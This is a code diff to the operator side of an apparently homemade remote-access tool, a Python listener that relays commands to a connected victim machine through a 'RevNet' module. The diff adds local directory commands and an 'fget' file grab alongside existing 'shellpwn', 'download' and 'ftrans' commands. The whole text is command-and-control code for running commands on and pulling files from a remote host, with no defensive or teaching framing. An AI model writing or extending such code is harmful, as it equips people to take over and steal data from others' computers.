@@ -4,6 +4,7 @@ import sys
 import time
 import _thread
 import RevNet
+import os
 
 def nop():
 
@@ -46,6 +47,8 @@ def sbind():
 
         print("Binding to: "+str(port))
 
+        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+
         s.bind((host,port))
 
         s.listen(5)
@@ -55,6 +58,8 @@ def sbind():
         print(str(msg))
 
 def saccept():
+
+    global s
 
     try:
 
@@ -78,6 +83,10 @@ def passcmd():
 
     global s
 
+    cdir=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))
+
+    print(cdir,end="")
+
     while True:
 
         cmd=input()
@@ -92,11 +101,39 @@ def passcmd():
 
             sys.exit()
 
+        elif cmd=="lpwd":
+
+            print(os.getcwd())
+
+            print(cdir,end="")
+
+        elif cmd[:3]=="lcd":
+
+            os.chdir(cmd[4:])
+
+            print(os.getcwd())
+
+            print(cdir,end="")
+
+        elif cmd=="lls":
+
+            files=os.listdir()
+
+            for filename in files:
+
+                print(filename)
+
+            print(cdir,end="")
+
         elif cmd[:6]=="ftrans":
 
             RevNet.send_all(c,str.encode(RevNet.enc("ftrans")))
 
             RevNet.ftrans(c,cmd[7:])
+
+            crecv=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))
+
+            print(crecv, end="")
 
         elif cmd[:8]=="download":
 
@@ -108,11 +145,23 @@ def passcmd():
 
             print(RevNet.recv_all(c).decode())
 
+            print(cdir,end="")
+
         elif cmd[:8]=="shellpwn":
 
             RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
 
             print(RevNet.dec(RevNet.recv_all(c).decode()))
+
+            print(cdir,end="")
+
+        elif cmd[:4]=="fget":
+
+            RevNet.send_all(c,str.encode(RevNet.enc(cmd)))
+
+            RevNet.frecv(c)
+
+            print(cdir,end="")
 
         elif len(str.encode(cmd))>0:
 
@@ -120,7 +169,13 @@ def passcmd():
 
             crecv=RevNet.dec(str(RevNet.recv_all(c).decode("utf-8")))
 
-            print(crecv, end="")
+            i=crecv.find('>')
+
+            n=crecv.find('`')
+
+            cdir=crecv[n+1:i+1]
+
+            print(crecv.replace('`',''), end="")
 
 def main():
 
